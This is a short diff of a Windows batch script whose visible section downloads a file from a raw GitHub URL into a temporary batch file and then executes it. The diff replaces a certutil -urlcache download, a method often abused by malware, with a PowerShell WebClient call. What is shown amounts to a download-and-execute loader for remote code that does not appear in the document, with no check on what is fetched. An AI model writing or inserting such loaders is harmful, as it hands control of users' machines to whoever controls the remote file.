@@ -15,7 +15,7 @@ set "embeddedScript=temp_script_RUNEVERY.bat"
 
 :RUNEVERYCALLER
 :: Download content and save to the embedded batch file
-certutil -urlcache -split -f "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/RunEvery" "%embeddedScript%"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/RunEvery') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     call "%embeddedScript%"
